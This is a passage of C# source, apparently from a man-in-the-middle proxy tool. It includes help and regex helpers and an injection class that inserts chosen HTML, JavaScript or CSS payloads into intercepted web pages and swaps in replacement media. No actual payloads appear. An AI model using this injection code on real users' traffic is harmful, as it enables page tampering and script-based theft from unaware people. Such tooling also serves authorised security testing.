                            pName = pName.Replace(".", " ");
                            string chk = pName.ToLower();
                            if (!command.ToLower().StartsWith(chk)) continue;
                            string[] validValues = r.GetAttribute("values").Split(',');
                            r.Read();
                            string explanation = r.Value;

                            if (cmdNumber == 1) console.Write("\r\n");

                            console.Write(cmdNumber.ToString() + ": " + pName + "\r\n");
                            
                            foreach(string v in validValues)
                            {
                                if (v == "|")
                                {
                                    console.Write("\r\n");
                                    continue;
                                }
                                console.Write(v + ",");
                            }

                            console.Write("\r\n" + explanation + "\r\n");
                        }
                    }
                }
            }
        }

        /// <summary>
        /// Create a group for interactive help running the user through the process of a command, action
        /// </summary>
        /// <param name="group">The grouping name for the guide</param>
        /// <param name="level">The help level of the guide</param>

        public void CreateInteractive(string group, string explanation, InteractiveLevel level = InteractiveLevel.Normal)
        {
            if (iGuide.ContainsKey(group)) return;
            InteractiveHelp ih = new InteractiveHelp();
            ih.level = level;
            ih.messages = new List<string>();
            ih.idle = new List<int>();
            ih.triggerNext = new List<Func<bool>>();
            iGuide.Add(group, ih);
            exp.Add(explanation);
        }

        /// <summary>
        /// Add one or multiple message/step to a guide
        /// </summary>
        /// <param name="group">The name of the earlier created group</param>
        /// <param name="messages">One or more string message/step</param>

        public void AddMessage(string group, params string[] messages)
        {
            if (!iGuide.ContainsKey(group)) return;

            InteractiveHelp ih = iGuide[group];
            List<string> f = new List<string>();

            foreach (string msg in ih.messages)
            {
                f.Add(msg);
            }

            foreach (string msg in messages)
            {
                f.Add(msg);
            }

            ih.messages = f;
            iGuide[group] = ih;
        }

        /// <summary>
        /// Add idle time between messages
        /// </summary>
        /// <param name="group">The group name</param>
        /// <param name="times">The idle time in seconds</param>

        public void AddIdle(string group, params int[] times)
        {
            if (!iGuide.ContainsKey(group)) return;

            InteractiveHelp ih = iGuide[group];
            List<int> f = new List<int>();

            foreach (int time in ih.idle)
            {
                f.Add(time);
            }

            foreach (int time in times)
            {
                f.Add(time);
            }

            ih.idle = f;
            iGuide[group] = ih;
        }

        /// <summary>
        /// Add when to move to the next message/step
        /// </summary>
        /// <param name="group">The group name</param>
        /// <param name="triggers">A condition, which is when true the next step come's</param>

        public void AddTrigger(string group, params Func<bool>[] triggers)
        {
            if (!iGuide.ContainsKey(group)) return;

            InteractiveHelp ih = iGuide[group];
            List<Func<bool>> f = new List<Func<bool>>();

            foreach (Func<bool> condition in ih.triggerNext)
            {
                f.Add(condition);
            }

            foreach (Func<bool> condition in triggers)
            {
                f.Add(condition);
            }

            ih.triggerNext = f;
            iGuide[group] = ih;
        }

        /// <summary>
        /// Remove all messages from a group
        /// </summary>
        /// <param name="group">The name of the group</param>

        public void ClearMessage(string group)
        {
            if (!iGuide.ContainsKey(group)) return;
            iGuide[group].messages.Clear();
        }

        /// <summary>
        /// Set the level of tutorial for a group
        /// </summary>
        /// <param name="group">The group name</param>
        /// <param name="level">The desired level</param>

        public void SetLevel(string group, InteractiveLevel level)
        {
            if (!iGuide.ContainsKey(group)) return;
            InteractiveHelp ih = iGuide[group];
            ih.level = level;
            iGuide[group] = ih;
        }

        /// <summary>
        /// Execute's a configured guide based on the parameters
        /// </summary>
        /// <param name="group">The name of the group to execute</param>

        public void RunInteractiveHelp(string group)
        {
            if (!iGuide.ContainsKey(group)) return;
            bool countCheck = false;
            int msgCount = iGuide[group].messages.Count;
            int idleCount = iGuide[group].idle.Count;
            int triggerCount = iGuide[group].messages.Count;
            if (msgCount == idleCount && msgCount == triggerCount) countCheck = true;
            if (!countCheck) return;
            InteractiveLevel level = iGuide[group].level;
            string[] messages = iGuide[group].messages.ToArray();
            GetCommandUpdates = true;
            Thread.Sleep(iGuide[group].idle[0] * 1000);
            WriteLine(messages[currentHelpIndex]);
            currentHelpIndex++;
            currentHelp = group;
        }

        /// <summary>
        /// Callback for checking progress of  the walkthrough
        /// </summary>
        /// <param name="cmd">String command</param>

        public void OnCommand(string cmd)
        {
            InteractiveHelp ih = iGuide[currentHelp];
            int currentIdle = ih.idle[currentHelpIndex - 1];
            Func<bool> currentCondition = ih.triggerNext[currentHelpIndex - 1];
            if (currentHelpIndex >= ih.messages.Count)
            {
                Thread.Sleep(currentIdle * 1000);
                WriteLine("Tutorial completed!");
                GetCommandUpdates = false;
                currentHelp = "";
                currentHelpIndex = 0;
                return;
            }
            string currentMessage = ih.messages[currentHelpIndex];

            if (currentCondition())
            {
                Thread.Sleep(currentIdle * 1000);
                WriteLine(currentMessage);
                currentHelpIndex++;
            }
        }

        /// <summary>
        /// List the Interactive Guide Modules
        /// </summary>

        public void ListInteractive()
        {
            if (iGuide.Count == 0)
            {
                console.WriteLine("No interactive help modules available!");
                return;
            }

            int index = 0;

            foreach (string name in iGuide.Keys)
            {
                console.WriteLine(name + " - " + exp[index]);
                index++;
            }
        }

        private IHelp GetHelperClass(string cmd)
        {
            if (cmd.StartsWith("help ")) cmd = cmd.Substring(5);

            foreach (object o in services)
            {
                IHelp obj;
                try { obj = (IHelp)o; }
                catch (Exception) { continue; };

                if (!File.Exists(obj.HelpFile)) continue;
                string firstLine = File.ReadAllLines(obj.HelpFile)[1];
                firstLine = firstLine.Replace("</commands>", String.Empty);
                firstLine = firstLine.Replace("<commands>", String.Empty);
                if (!firstLine.Contains(","))
                {
                    if (firstLine == cmd) return obj;
                    else continue;
                }
                string[] cmds = firstLine.Split(',');
                foreach (string entry in cmds)
                {
                    if (cmd.StartsWith(entry) && entry != "")
                    {
                        return obj;
                    }
                }
            }

            return null;
        }

        private void WriteLine(string message)
        {
            console.Clear();
            console.WriteLine(message, console.GetIntercativeGroup());
        }
    }

    public class VRegEx : IService, ISettings, IHelp, IDisposable
    {
        //IDisposable Implementation

        bool disposed = false;
        SafeFileHandle handle = new SafeFileHandle(IntPtr.Zero, true);

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposed) return;
            if (disposing)
            {
                handle.Dispose();
                _helpFile = null;
                _pRestore = null;
                _list.Clear();
                _list = null;
                logger = null;
            }

            disposed = true;
        }

        //IHelp Implementation

        private string _helpFile = "";

        public string HelpFile
        {
            get { return _helpFile; }
            set
            {
                if (File.Exists(value)) _helpFile = value;
            }
        }

        //ISettings Implementation

        public void LoadSettings(KeyValuePair<string, string> kvp)
        {
            string key = kvp.Key.ToLower();
            string value = kvp.Value.ToLower();

            if (key == "state") started = (value == "true") ? true : false;
            if (key == "def_name")
            {
                if (!_list.ContainsKey(kvp.Value))
                {
                    RegList rl = new RegList();
                    rl.list = new List<Regex>();
                    _list.Add(kvp.Value, rl);
                }
            }
            if (key.StartsWith("reg_name_"))
            {
                string entryName = kvp.Key.Substring(9);
                string entryValue = kvp.Value;
                if (!_list.ContainsKey(entryName))
                {
                    RegList rl = new RegList();
                    rl.list = new List<Regex>();
                    _list.Add(entryName, rl);
                }

                RegList current = _list[entryName];
                Regex expression = new Regex(entryValue);
                current.list.Add(expression);
                _list[entryName] = current;
            }
        }

        public void WriteSettings(System.Xml.XmlWriter xml)
        {
            xml.WriteStartElement("settings_start");

            xml.WriteElementString("state", (started) ? "true" : "false");

            foreach (KeyValuePair<string, RegList> kvp in _list)
            {
                string name = kvp.Key;
                xml.WriteElementString("def_name", name);

                foreach (Regex reg in kvp.Value.list)
                {
                    string value = reg.ToString();
                    xml.WriteElementString("reg_name_" + name, value);
                }
            }

            xml.WriteEndElement();
        }

        //IService Implementation

        private bool _started = true;
        private string _pRestore = "";
        private bool _selfInteractive = false;

        public bool selfInteractive { get { return _selfInteractive; } set { _selfInteractive = value; }  }
        public bool started { get { return _started; } set { _started = value; } }
        public string pRestore { get { return _pRestore; } set { _pRestore = value; } }

        public void WarningMessage()
        {
            logger.Log("Regex Manager Service is not started!", VLogger.LogLevel.warning);
        }

        //Main RegEx Manager class

        struct RegList
        {
            public List<Regex> list;
        }

        private Dictionary<string, RegList> _list = new Dictionary<string, RegList>();
        private VLogger logger;

        public VRegEx(VLogger log)
        {
            logger = log;
        }

        public bool Add(string groupName)
        {
            if (_list.ContainsKey(groupName)) return false;
            RegList rl = new RegList();
            rl.list = new List<Regex>();
            _list.Add(groupName, rl);

            return true;
        }

        public bool AddExpression(string groupName, string expression)
        {
            if (!_list.ContainsKey(groupName)) return false;
            RegList rl = _list[groupName];
            Regex rx = new Regex(expression);
            rl.list.Add(rx);
            _list[groupName] = rl;

            return true;
        }

        public bool RunAnd(string input, string group)
        {
            if (!_list.ContainsKey(group)) return false;

            RegList rl = _list[group];

            foreach (Regex r in rl.list)
            {
                Match tResult = r.Match(input);
                bool tmp = tResult.Success;
                if (tmp == false) return false;
            }

            return true;
        }

        public bool RunOr(string input, string group)
        {
            if (!_list.ContainsKey(group)) return false;

            RegList rl = _list[group];

            foreach (Regex r in rl.list)
            {
                Match tResult = r.Match(input);
                bool tmp = tResult.Success;
                if (tmp == true) return true;
            }

            return false;
        }

        public bool Remove(string groupName)
        {
            if (!_list.ContainsKey(groupName)) return false;

            _list.Remove(groupName);

            return true;
        }

        public bool RemoveExpression(string groupName, string expression)
        {
            if (!_list.ContainsKey(groupName)) return false;

            RegList rl = _list[groupName];
            int index = 0;
            bool canRemove = false;

            foreach (Regex r in rl.list)
            {
                if (r.ToString() == expression)
                {
                    canRemove = true;
                    break;
                }

                index++;
            }

            if (canRemove) rl.list.RemoveAt(index);

            return true;
        }

        public bool IsRegexEmpty(string group)
        {
            if (group == null) return true;
            if (!_list.ContainsKey(group)) return true;
            RegList rl = _list[group];
            if (rl.list.Count <= 0) return true;
            else return false;
        }

        public string ListExpressions(string group)
        {
            string result = "";

            if (!_list.ContainsKey(group)) return null;

            RegList rl = _list[group];
            if (rl.list == null) return null;
            result = "==Start of Regular Expressions List==\r\n";
            result += "Count: " + rl.list.Count + "\r\n";

            foreach (Regex rx in rl.list)
            {
                result += rx.ToString() + "\r\n";
            }

            result += "==End of Regular Expressions List==\r\n";

            return result;
        }

        public string ListGroups()
        {
            string result = "";

            result = "==Start of RegEx group list==\r\n";
            result += "Count: " + _list.Keys.Count + "\r\n";

            foreach (string s in _list.Keys)
            {
                result += s + "\r\n";
            }

            result += "==End fo RegEx group list==\r\n";

            return result;
        }
    }

    public class VInject : IFilter, IRegEx, ISettings, IHelp, IDisposable
    {
        //IDisposable Implementation

        bool disposed = false;
        SafeFileHandle handle = new SafeFileHandle(IntPtr.Zero, true);

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposed) return;
            if (disposing)
            {
                handle.Dispose();
                _helpFile = null;
                _regex.Clear();
                _regex = null;
                _rxmanager = null;
                filterNames.Clear();
                filterNames = null;
                _vfmanager = null;
                reg = null;
                mediaReplace.Clear();
                mediaReplace = null;
                payloadReplace.Clear();
                payloadReplace = null;
                autoPayload = null;
                console = null;
            }

            disposed = true;
        }

        //IHelp implementation

        private string _helpFile = "";

        public string HelpFile
        {
            get { return _helpFile; }
            set
            {
                if (File.Exists(value)) _helpFile = value;
            }
        }


        //ISettings Implementation

        public void LoadSettings(KeyValuePair<string, string> kvp)
        {
            string key = kvp.Key.ToLower();
            string value = kvp.Value.ToLower();

            if (key == "match_mode") mMode = StringToMatchMode(value);
            if (key == "match_option") mOption = StringToMatchOption(value);
            if (key == "match_file") filePathOption = StringToMatchOption(value);
            if (key == "match_engine") mEngine = StringToMatchEngine(value);
            if (key == "auto_payload") autoPayload = kvp.Value;
            if (key == "r_bind") PullRBindInfo(kvp.Value);
            if (key == "f_bind") PullBindInfo(kvp.Value);
            if (key.StartsWith("payload_rep_"))
            {
                string k = kvp.Key.Substring(12);
                string v = kvp.Value;
                if (!payloadReplace.ContainsKey(k)) payloadReplace.Add(k, v);
            }
            if (key.StartsWith("media_rep_"))
            {
                string k = kvp.Key.Substring(10);
                string v = kvp.Value;
                if (!mediaReplace.ContainsKey(k)) mediaReplace.Add(k, v);
            }
        }

        public void WriteSettings(System.Xml.XmlWriter xml)
        {
            xml.WriteStartElement("settings_start");

            xml.WriteElementString("match_mode", MatchModeToString(mMode));
            xml.WriteElementString("match_option", MatchOptionToString(mOption));
            xml.WriteElementString("match_engine", MatchEngineToString(mEngine));
            xml.WriteElementString("match_file", MatchOptionToString(filePathOption));
            xml.WriteElementString("auto_payload", autoPayload);
            xml.WriteElementString("r_bind", PushRBindInfo());
            xml.WriteElementString("f_bind", PushBindInfo());
            foreach (KeyValuePair<string, string> kvp in payloadReplace)
            {
                xml.WriteElementString("payload_rep_" + kvp.Key, kvp.Value);
            }
            foreach (KeyValuePair<string, string> kvp in mediaReplace)
            {
                xml.WriteElementString("media_rep_" + kvp.Key, kvp.Value);
            }

            xml.WriteEndElement();
        }

        //IRegEx Implementation

        private Dictionary<string, object> _regex = new Dictionary<string, object>();
        private VRegEx _rxmanager;

        public VRegEx Rxmanager { get { return _rxmanager; } set { _rxmanager = value; } }
        public Dictionary<string, object> RegExName { get { return _regex; } set { _regex = value; } }

        public bool BindRegEx(string regexName, object parameter)
        {
            if (RegExName.ContainsKey(regexName)) return false;
            RegExName.Add(regexName, parameter);
            return true;
        }

        public bool UnBindRegEx(string regexName)
        {
            if (!RegExName.ContainsKey(regexName)) return false;
            RegExName.Remove(regexName);

            return true;
        }

        public void SetManager(VRegEx regex)
        {
            Rxmanager = regex;
        }

        public void BindListR()
        {
            console.WriteLine("==Start of RegEx bind List==", "ig.inject");
            foreach (KeyValuePair<string, object> kvp in RegExName)
            {
                string part2 = kvp.Value.ToString();
                console.WriteLine(kvp.Key + ":\t" + part2, "ig.inject");
            }
            console.WriteLine("==End of RegEx bind list==", "ig.inject");
        }

        public bool MatchRegex(string mode, object parameter, string value)
        {
            string realRegexName = "";
            bool canSet = false;
            int index = 0;

            foreach (object f in RegExName.Values)
            {
                string val = f.ToString();
                if (val == parameter.ToString())
                {
                    canSet = true;
                    break;
                }

                index++;
            }

            if (canSet) realRegexName = RegExName.Keys.ToArray()[index];
            else return false;

            bool result = false;

            if (mode == "and")
            {
                result = Rxmanager.RunAnd(value, realRegexName);
            }
            else if (mode == "or")
            {
                result = Rxmanager.RunOr(value, realRegexName);
            }

            return result;
        }

        public string PushRBindInfo()
        {
            string finalResult = "";

            foreach (KeyValuePair<string, object> kvp in RegExName)
            {
                string key = kvp.Key;
                string value = kvp.Value.ToString();
                finalResult += key + ":" + value + ";";
            }

            if (finalResult.Length > 0) finalResult = finalResult.Substring(0, finalResult.Length - 1);

            return finalResult;
        }

        public void PullRBindInfo(string info)
        {
            string[] data = info.Split(';');

            foreach (string d in data)
            {
                string[] subData = d.Split(':');
                string key = subData[0];
                string value = subData[1];

                BindRegEx(key, value);
            }
        }

        //IFilter Implementation

        private Dictionary<string, object> filterNames = new Dictionary<string, object>();
        private VFilter _vfmanager;

        public Dictionary<string, object> filterName
        {
            get { return filterNames; }
            set { filterNames = value; }
        }

        public VFilter manager
        {
            get { return _vfmanager; }
            set { _vfmanager = value; }
        }

        public string PushBindInfo()
        {
            string info = "";

            foreach (KeyValuePair<string, object> kvp in filterNames)
            {
                string part2 = kvp.Value.ToString();
                info += kvp.Key + ":" + part2 + ";";
            }

            if (info.Length > 0) info = info.Substring(0, info.Length - 1);

            return info;
        }

        public void PullBindInfo(string info)
        {
            if (info == "") return;
            String[] kvp = info.Split(';');
            foreach (String pairs in kvp)
            {
                string[] kvp2 = pairs.Split(':');
                string level = kvp2[1];
                string name = kvp2[0];
                filterNames.Add(name, level);
            }
        }

        public bool BindFilter(string validFilterName, object input)
        {
            string op = (string)input;
            filterNames.Add(validFilterName, op);
            return true;
        }

        public bool SearchFilter(string sMethod, object searchParam, string input)
        {
            string p = (string)searchParam;
            string targetFilterName = "";
            foreach (KeyValuePair<string, object> pair in filterNames)
            {
                string comp = (string)pair.Value;
                if (comp == p)
                {
                    targetFilterName = pair.Key;
                    break;
                }
            }

            if (targetFilterName == "")
            {
                return false; // if target filter is not found deny, because we don't want to inject at random places
            }

            if (sMethod == "and")
            {
                return manager.RunAllCompareAnd(targetFilterName, input);
            }
            else if (sMethod == "or")
            {
                return manager.RunAllCompareOr(targetFilterName, input);
            }
            else
            {
                //console.WriteLine("[ERROR] Invalid SearchFilter option sMethod", console.GetIntercativeGroup());
                return false;
            }
        }

        public bool UnBindFilter(string validFilterName)
        {
            if (!filterName.ContainsKey(validFilterName)) return false;
            filterName.Remove(validFilterName);
            return true;
        }

        public void BindList()
        {
            console.WriteLine("=========Start Of bind list=========", "ig.inject");
            foreach (KeyValuePair<string, object> kvp in filterNames)
            {
                string ll = (string)kvp.Value;
                console.WriteLine(kvp.Key + ":\t" + ll, "ig.inject");
            }
            console.WriteLine("==========End Of bind list==========", "ig.inject");
        }

        public void SetManager(VFilter fman)
        {
            manager = fman;
        }

        //Main inject class

        public enum Mode
        {
            HTML,
            Javascript,
            CSS
        }

        public enum MatchMode
        {
            Replace,
            InjectAfter,
            InjectBefore
        }

        public enum MatchEngine
        {
            RegEx,
            Filters
        }

        public enum MatchOptions
        {
            And,
            Or,
            Both,
            Undefined
        }

        public MatchEngine mEngine = MatchEngine.Filters;
        public MatchOptions mOption = MatchOptions.And;
        public MatchOptions filePathOption = MatchOptions.And;
        public MatchMode mMode = MatchMode.InjectAfter;
        private VConsole console;
        private VRegEx reg;
        private Dictionary<string, string> mediaReplace = new Dictionary<string, string>();
        private Dictionary<string, string> payloadReplace = new Dictionary<string, string>();
        public string autoPayload = "";

        public VInject(VConsole con, VRegEx rx, VMitm mitm, VDependencyWatcher dw, Form1 ctx)
        {
            console = con;
            reg = rx;
            dw.AddCondition(() => mitm.CheckServiceState(VMitm.InjectServices.AutoInjection) && autoPayload == "", ctx.CreateLog("Auto inujection is enabled, but no payload is set", VLogger.LogLevel.warning));
            dw.AddCondition(() => mitm.CheckServiceState(VMitm.InjectServices.MatchInjection) && payloadReplace.Count == 0, ctx.CreateLog("Match Injection is enabled, but no payload is set", VLogger.LogLevel.warning));
            dw.AddCondition(() => mitm.CheckServiceState(VMitm.InjectServices.MediaInjection) && mediaReplace.Count == 0, ctx.CreateLog("Media Injection is enabled, but no file is set", VLogger.LogLevel.warning));
            dw.AddCondition(() => !mitm.IsAllOfflineI() && !mitm.started, ctx.CreateLog("One or more injection service is enabled, but mitm service is not running!", VLogger.LogLevel.warning));
            dw.AddCondition(() => mitm.CheckServiceState(VMitm.InjectServices.MatchInjection) && mitm.CheckServiceState(VMitm.InjectServices.AutoInjection), ctx.CreateLog("Both Match and Auto injection is enabled, this may produce unexpected results!", VLogger.LogLevel.warning));
        }

        public string AutoInject(string originalText, string payload, Mode iMode)
        {
            string finalResult = "";

            if (iMode == Mode.HTML)
            {
                string[] lines = originalText.Split('\n');
                string[] tempLines = originalText.Split('\n');
                string keyElement = "";
                int lnIndex = 0;

                if (lines.Contains("</body>") && keyElement == "") keyElement = "</body>";
                if (lines.Contains("</head>") && keyElement == "") keyElement = "</head>";

                foreach (string tline in lines)
                {
                    string line = "";
                    if (tline.EndsWith("\r")) line = line.Replace("\r", String.Empty);
                    else line = tline;

                    if (keyElement == "")
                    {
                        finalResult = originalText + ((originalText.EndsWith("\r\n")) ? "" : "\r\n") + payload;
                    }
                    else
                    {
                        if (line == keyElement)
                        {
                            tempLines[lnIndex] = payload + "\r\n" + keyElement + "\r";

                            foreach (string text in tempLines)
                            {
                                finalResult += text + "\n";
                            }

                            break;
                        }
                    }

                    lnIndex++;
                }
            }

            if (iMode == Mode.Javascript || iMode == Mode.CSS)
            {
                finalResult = originalText + "\r\n" + payload + "\r\n";
            }

            return finalResult;
        }

        public string MatchAndInject(string original, string payload, MatchMode mMode, MatchOptions opt)
        {
            string finalResult = "";

            string[] lines = original.Split('\n');
            string[] tempLines = original.Split('\n');
            int lnIndex = 0;

            foreach (string tline in lines)
            {
                string line = "";
                if (tline.EndsWith("\r")) line = tline.Replace("\r", String.Empty);
                else line = tline;

                if (mEngine == MatchEngine.Filters)
                {
                    bool isOrEmpty = false;
                    bool isAndEmpty = false;
                    string andName = GetFilterByParam("inject_and");
                    string orName = GetFilterByParam("inject_or");
                    isOrEmpty = manager.IsFilterEmpty(orName);
                    isAndEmpty = manager.IsFilterEmpty(andName);
                    bool result = false;

                    if (!isOrEmpty && !isAndEmpty)
                    {
                        bool r1 = SearchFilter("or", "inject_or", line);
                        bool r2 = SearchFilter("and", "inject_and", line);

                        if (opt == MatchOptions.Both && r1 && r2) result = true;
                        else if (opt == MatchOptions.Or && r1) result = true;
                        else if (opt == MatchOptions.And && r2) result = true;
                        else result = false;
                    }
                    else if (!isOrEmpty && (opt == MatchOptions.Both || opt == MatchOptions.Or))
                    {
                        result = SearchFilter("or", "inject_or", line);
                    }
                    else if (!isAndEmpty && (opt == MatchOptions.Both || opt == MatchOptions.And))
                    {
                        result = SearchFilter("and", "inject_and", line);
                    }
                    else
                    {
                        return original;
                    }

                    if (result)
                    {
                        if (mMode == MatchMode.Replace)
                        {
                            tempLines[lnIndex] = payload + "\r";
                        }
                        else if (mMode == MatchMode.InjectAfter)
                        {
                            string org = line;
                            tempLines[lnIndex] = org + "\r\n" + payload + "\r";
                        }
                        else if (mMode == MatchMode.InjectBefore)
                        {
                            string org = line;
                            tempLines[lnIndex] = payload + "\r\n" + org + "\r";
                        }

                        foreach (string sline in tempLines)
                        {
                            finalResult += sline + "\n";
                        }

                        return finalResult;
                    }
                }
                else if (mEngine == MatchEngine.RegEx)
                {
                    bool isOrEmpty = false;
                    bool isAndEmpty = false;
                    string andName = GetRegexByParam("inject_and");
                    string orName = GetRegexByParam("inject_or");
                    isOrEmpty = Rxmanager.IsRegexEmpty(orName);
                    isAndEmpty = Rxmanager.IsRegexEmpty(andName);
                    bool result = false;

                    if (!isOrEmpty && !isAndEmpty)
                    {
                        bool r1 = MatchRegex("or", "inject_or", line);
                        bool r2 = MatchRegex("and", "inject_and", line);

                        if (opt == MatchOptions.Both && r1 && r2) result = true;
                        else if (opt == MatchOptions.Or && r1) result = true;
                        else if (opt == MatchOptions.And && r2) result = true;
                        else result = false;
                    }
                    else if (!isOrEmpty && (opt == MatchOptions.Both || opt == MatchOptions.Or))
                    {
                        result = MatchRegex("or", "inject_or", line);
                    }
                    else if (!isAndEmpty && (opt == MatchOptions.Both || opt == MatchOptions.And))
                    {
                        result = MatchRegex("and", "inject_and", line);
                    }
                    else
                    {
                        return original;
                    }

                    if (result)
                    {
                        if (mMode == MatchMode.Replace)
                        {
                            tempLines[lnIndex] = payload + "\r";
                        }
                        else if (mMode == MatchMode.InjectAfter)
                        {
                            string org = line;
                            tempLines[lnIndex] = org + "\r\n" + payload + "\r";
                        }
                        else if (mMode == MatchMode.InjectBefore)
                        {
                            string org = line;
                            tempLines[lnIndex] = payload + "\r\n" + org + "\r";
                        }

                        foreach (string sline in tempLines)
                        {
                            finalResult += sline + "\n";
                        }

                        return finalResult;
                    }
                }

                lnIndex++;
            }

            return finalResult;
        }

        public bool MediaReplace(Request r, MatchOptions filePathMatching)
        {
            bool andResult = false;
            bool orResult = false;

            if (mEngine == MatchEngine.Filters)
            {
                andResult = SearchFilter("and", "inject_media_and", r.target);
                orResult = SearchFilter("or", "inject_media_or", r.target);
            }
            else if (mEngine == MatchEngine.RegEx)
            {
                andResult = MatchRegex("and", "inject_media_and", r.target);
                orResult = MatchRegex("or", "inject_media_or", r.target);
            }
            else return false;

            if (filePathMatching == MatchOptions.Both && andResult && orResult) return true;
            else if (filePathMatching == MatchOptions.And && andResult) return true;
            else if (filePathMatching == MatchOptions.Or && orResult) return true;
            else return false;
        }

        public byte[] GetMediaHijack(Request r)
        {
            string targetFile = r.target;
            bool canContinue = false;
            string _lfilterName = "";
            foreach (string fname in mediaReplace.Keys)
            {
                string mode = (fname.Contains("or")) ? "or" : "and";
                bool result = (mode == "and") ? manager.RunAllCompareAnd(fname, targetFile) : manager.RunAllCompareOr(fname, targetFile);
                if (result)
                {
                    canContinue = true;
                    _lfilterName = fname;
                    break;
                }
            }
            if (!canContinue) return null;
            string newFile = mediaReplace[_lfilterName];
            if (IsLocalFile(newFile))
            {
                return File.ReadAllBytes(newFile);
            }
            else
            {
                try
                {
                    WebClient wc = new WebClient();
                    wc.Proxy = null;
                    byte[] file = wc.DownloadData(newFile);
                    return file;
                }
                catch (Exception ex)
                {
                    console.Debug("Web Image Inject failed!");
                    return null;
                }
            }
        }

        public bool AssignPayload(string filterName, string payload)
        {
            if (payloadReplace.ContainsKey(filterName)) return false;
            payloadReplace.Add(filterName, payload);
            return true;
        }

        public bool RemovePayload(string filterName)
        {
            if (!payloadReplace.ContainsKey(filterName)) return false;
            payloadReplace.Remove(filterName);
            return true;
        }

        public void ListPayload()
        {
            console.WriteLine("==Start of payload list==", "ig.inject");
            console.WriteLine("Count: " + payloadReplace.Count, "ig.inject");
            foreach (KeyValuePair<string, string> kvp in payloadReplace)
            {
                console.WriteLine(kvp.Key + ":\t" + kvp.Value, "ig.inject");
            }
            console.WriteLine("==End of payload list==", "ig.inject");
        }

        public bool AssignFilterToFile(string filterName, string filePath)
        {
            if (mediaReplace.ContainsKey(filterName)) return false;
            //if (!File.Exists(filePath)) return false;

            mediaReplace.Add(filterName, filePath);

            return true;
        }

        public bool RemoveFilterToFile(string filterName)
        {
            if (!mediaReplace.ContainsKey(filterName)) return false;

            mediaReplace.Remove(filterName);

            return false;
        }

        public void FilterToFileList()
        {
            console.WriteLine("==Start of filter->file bind list==", "ig.inject");
            console.WriteLine("Count: " + mediaReplace.Count, "ig.inject");

            foreach (KeyValuePair<string, string> kvp in mediaReplace)
            {
                console.WriteLine(kvp.Key + ":\t" + kvp.Value, "ig.inject");
            }

            console.WriteLine("==End of list==", "ig.inject");
        }

        public string GetCurrentPayload()
        {
            string xname = "";
            string suffix = "_";
            if (mOption == MatchOptions.And) suffix += "and";
            else if (mOption == MatchOptions.Or) suffix += "or";
            else if (mOption == MatchOptions.Both) suffix += "both";
            else return null;
            if (suffix == "_both")
            {
                string xname2 = "";
                if (mEngine == MatchEngine.Filters)
                {
                    xname = GetFilterByParam("inject_and");
                    xname2 = GetFilterByParam("inject_or");
                }
                else
                {
                    xname = GetRegexByParam("inject_and");
                    xname2 = GetRegexByParam("inject_or");
                }

                if (xname != null && xname2 != null)
                {
                    string p1 = null;
                    string p2 = null;
                    if (payloadReplace.ContainsKey(xname)) p1 = payloadReplace[xname];
                    if (payloadReplace.ContainsKey(xname2)) p2 = payloadReplace[xname2];

                    if (p1 != null && p2 != null && p1 == p2) return p1;
                    else if (p1 != null && p2 != null)
                    {
                        console.Debug("And, or inject list payload mismatch!");
                        return p1;
                    }
                    else if (p1 == null) return p2;
                    else if (p2 == null) return p1;
                    else return null;
                }
                else if (xname != null)
                {
                    if (payloadReplace.ContainsKey(xname)) return payloadReplace[xname];
                    else return null;
                }
                else if (xname2 != null)
                {
                    if (payloadReplace.ContainsKey(xname2)) return payloadReplace[xname2];
                    else return null;
                }
                else return null;
            }
            else
            {
                if (mEngine == MatchEngine.Filters) xname = GetFilterByParam("inject" + suffix);
                else xname = GetRegexByParam("inject" + suffix);

                if (payloadReplace.ContainsKey(xname)) return payloadReplace[xname];
                else return null;
            }
        }

        private bool IsLocalFile(string filePath)
        {
            bool colonFound = false;
            bool bslashFound = false;

            for (int i = 0; i < filePath.Length; i++)
            {
                char c = filePath[i];
                if (c == ':' && i == 1)
                {
                    colonFound = true;
                }

                if (c == '\\' && i == 2)
                {
                    bslashFound = true;
                }

                if (colonFound && bslashFound) return true;
                if (i > 10) return false;
            }

            return false;
        }

        private string GetRegexByParam(string param)
        {
            if (RegExName.Count <= 0) return null;
            int index = 0;
            bool canSet = false;

            foreach (KeyValuePair<string, object> kvp in RegExName)
            {
                if (kvp.Value.ToString() == param)
                {
                    canSet = true;
                    break;
                }

                index++;
            }

            if (canSet)
            {
                string result = RegExName.Keys.ToArray()[index];
                return result;
            }

            return null;
        }

        private string GetFilterByParam(string param)
        {
            if (filterNames.Count <= 0) return null;
            if (filterNames.ContainsValue(param))
            {
                int index = 0;
                foreach (object f in filterNames.Values)
                {
                    if (f.ToString() == param)
                    {
                        return filterNames.Keys.ToArray()[index];
                    }
                }
            }

            return null;
        }

        public static string MatchModeToString(MatchMode mm)
        {
            if (mm == MatchMode.InjectAfter) return "after";
            else if (mm == MatchMode.InjectBefore) return "before";
            else return "replace";
        }

        public static MatchMode StringToMatchMode(string input)
        {
            input = input.ToLower();
            if (input == "after") return MatchMode.InjectAfter;
            else if (input == "before") return MatchMode.InjectBefore;
            else return MatchMode.Replace;
        }

        public static string MatchOptionToString(MatchOptions mo)
        {
            if (mo == MatchOptions.And) return "and";
            else if (mo == MatchOptions.Or) return "or";
            else if (mo == MatchOptions.Both) return "both";
            else return "undefined";
        }

        public static MatchOptions StringToMatchOption(string value)
        {
            value = value.ToLower();
            if (value == "and") return MatchOptions.And;
            else if (value == "or") return MatchOptions.Or;
            else if (value == "both") return MatchOptions.Both;
            else return MatchOptions.Undefined;
        }

        public static string MatchEngineToString(MatchEngine me)
        {
            if (me == MatchEngine.Filters) return "filter";
            else return "regex";
        }

        public static MatchEngine StringToMatchEngine(string value)
        {
            value = value.ToLower();
            if (value == "filter") return MatchEngine.Filters;
            else return MatchEngine.RegEx;
        }
    }

    public class VDependencyWatcher : IDisposable
    {
        //IDisposable Implementation

        bool disposed = false;
        SafeFileHandle handle = new SafeFileHandle(IntPtr.Zero, true);

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposed) return;
            if (disposing)
            {
                handle.Dispose();
                StopWatcher();
                if (conditionList != null) conditionList.Clear();
                conditionList = null;
                if (alertMessages != null) alertMessages.Clear();
                alertMessages = null;
                _thread = null;
